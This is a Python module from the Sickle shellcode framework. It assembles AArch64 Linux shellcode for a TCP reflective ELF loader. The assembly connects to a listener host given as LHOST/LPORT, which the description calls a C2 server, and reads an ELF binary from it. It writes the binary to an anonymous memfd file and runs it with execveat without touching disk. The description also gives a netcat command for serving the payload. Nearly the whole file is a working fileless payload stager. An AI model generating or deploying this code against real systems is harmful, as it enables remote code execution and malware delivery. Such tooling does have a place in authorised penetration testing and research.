from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.lib.generic.mparser import argument_check
from sickle.common.lib.generic.convert import ip_str_to_inet_addr
from sickle.common.lib.generic.convert import port_str_to_htons

import sys
import struct
import binascii

class Shellcode():

    arch = "aarch64"

    platform = "linux"

    name = "Linux (AARCH64) TCP Reflective ELF Loader"

    module = f"{platform}/{arch}/memfd_reflective_elf_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=127.0.0.1 LPORT=42 -f c"

    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Debian 14.2.0-6"]

    summary = ("TCP-based reflective ELF loader over IPV4 which executes an ELF from"
              " a remote server")

    description = f"""
    TCP based reflective ELF loader over IPV4 that will connect to a remote C2 server
    and download an ELF. Once downloaded, an anonymous file will be created to store
    the ELF file. Upon completion, it will execute in memory without touching disk.

    As an example, your \"C2 Server\" can be as simple as Netcat:

        nc -w 15 -lvp 42 < payload

    Then you can you generate the shellcode accordingly:

        {example_run}

    Upon execution of the shellcode, you should get a connection from the target and
    your ELF should execute in memory.
    """

    arguments = {}

    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

    def get_shellcode(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = argv_dict["LPORT"]

        sc_builder = Assembler(Shellcode.arch)

        source_code = (
        """
_start:

create_allocation:                                                                                                    
    // x8 => mmap(void addr[.length], // x0 => Kernel knows whats best, let em decide
    //            size_t length,      // x1 => Size of initial allocation
    //            int prot,           // x2 => (PROT_READ | PROT_WRITE)
    //            int flags,          // x3 => MAP_PRIVATE | MAP_ANONYMOUS)
    //            int fd,             // x4 => Create anonymous mapping
    //            off_t offset);      // x5 => Offset      
    eor x0, x0, x0
    mov x1, #0x500
    mov x2, #0x03
    mov x3, #0x22
    eor x4, x4, x4
    sub x4, x4, #1
    eor x5, x5, x5
    mov x8, #0xde
    svc #0x1337
    str x0, [sp, #0x40]

create_sockfd:                                                                                                        
    // x8 => socket(int domain,    // x0 => AF_INET        
    //              int type,      // x1 => SOCK_STREAM
    //              int protocol); // x2 => IPPROTO_TCP
                                                                                                                      
    mov x0, #0x02                                          
    mov x1, #0x01                               
    mov x2, #0x06                                                                                                     
    mov x8, #0xc6                                          
    svc #0x1337
    str x0, [sp, #0x48]

connect:                                                                                                              
    // x8 => connect(int sockfd,                   // x0 => sockfd
    //               const struct sockaddr *addr,  // x1 => sockaddr struct
    //               socklen_t addrlen;            // x2 => sizeof(sockaddr struct)                                   
                                                           
    mov x0, #0x02
    strh w0, [sp, #0x50]                       
    mov x0, #{}
    strh w0,[sp, #0x52]                                    
    ldr w0, ={}
    str w0, [sp, #0x54]                                                                                               
    eor x0, x0, x0
    str x0, [sp, #0x58]
    ldr x0, [sp, #0x48]
    mov x1, sp
    add x1, x1, #0x50
    mov x2, #0x10
    mov x8, #0xcb
    svc #0x1337

init_download:
    // x8 = write(int fd,                 // x0 => sockfd
    //            const void buf[.count], // x1 => strlen(msg)
    //            size_t count);          // x2 => msg

    ldr w0, =0x41414141
    strh w0, [sp, #0x60]
    eor x0, x0, x0
    strh w0, [sp, #0x64]
    ldr x0, [sp, #0x48]
    mov x1, sp
    add x1, x1, #0x60
    mov x2, 0x04
    mov x8, #0x40
    svc #0x1337

set_index:
    eor x14, x14, x14 

download_stager:
    mov x9, #0x80 // index to "buffer" where we initially store the data

    // x8 => read(int fd,        // x0 => sockfd
    //            void *buf      // x1 => Anywhere on the stack
    //            size_t count); // x2 => 0x500

    ldr x0, [sp, #0x48]
    mov x1, sp
    add x1, x1, x9
    mov x2, #0x500
    mov x8, #0x3F
    svc #0x1337

    cmp x0, #0x00
    b.eq download_complete    

adjust_allocation:
    ldr x15, [sp, #0x40]
    mov x12, x0

write_data:
    ldrb w10, [sp, x9]
    strb w10, [x15, x14, lsl #0]
    add x14, x14, #0x01
    add x9, x9, #0x01
    sub x0, x0, #0x01    
 
    cmp x0, #0x00
    cbnz x0, write_data

check_size:
    cmp x12, #0x00
    b.eq download_complete

realloc:
    // x8 => mremap(void old_address,    // x0 => *last_alloc
    //              size_t old_size,     // x1 => sizeof(last_alloc)
    //              size_t new_size,     // x2 => sizeof(new_alloc)
    //              int flags,           // x3 => MREMAP_MAYMOVE
    //              void *new_address);  // x4 => &out

    ldr x0, [sp, #0x40]
    mov x1, x14
    mov x13, x14
    add x13, x13, #0x500
    mov x2, x13
    mov x3, #0x01
    mov x4, sp
    mov x8, #0xd8
    svc #0x1337
    str x0, [sp, #0x40]

    b download_stager

download_complete:
    str x14, [sp, #0x30]

create_memory_file:

    // x8 => memfd_create(const char *name,     // x0 => *buffer
    //                     unsigned int flags); // x1 => MFD_CLOEXEC (0x01)

    mov x9, sp
    add x9, x9, #0x80
    eor x0, x0, x0
    str x0, [x9]
    ldr w0, =0x41414141
    strh w0, [x9]
    mov x0, x9
    mov x1, #0x01
    mov x8, #0x117
    svc #0x1337
    str x0, [sp, #0x80]

write_to_file:
    // x8 = write(int fd,                  // x0 => fd
    //            const void buf[.count],  // x1 => *elf
    //            size_t count);           // x2 => sizeof(elf)

    ldr x0, [sp, #0x80]
    ldr x1, [sp, #0x40]
    ldr x2, [sp, #0x30]
    mov x8, #0x40
    svc #0x1337

execute_elf:
    // x8 = execveat(int dirfd,                     // x0 => File descriptor of anonymous mapping
    //               const char *pathname,          // x1 => Empty string
    //               char *const _Nullable argv[],  // x2 => []
    //               char *const _Nullable envp[],  // x3 => addr
    //               int flags);                    // x4 => AT_EMPTY_PATH

    ldr x7, [sp, #0x80]
    eor x0, x0, x0
    mov x1, sp
    add x1, x1, #0x80
    str x0, [x1]
    mov x0, #0x20
    strb w0, [x1]
    mov x4, 0x1000
    eor x0, x0, x0
    str x0, [x9]
    mov x2, x9
    str x0, [sp]
    mov x3, sp
    mov x0, x7
    mov x8, #0x119
    svc #0x1337

exit:
    eor x0, x0, x0
    ret
        """
        ).format(hex(port_str_to_htons(lport)),
                 hex(ip_str_to_inet_addr(argv_dict["LHOST"])))


        return sc_builder.get_bytes_from_asm(source_code)
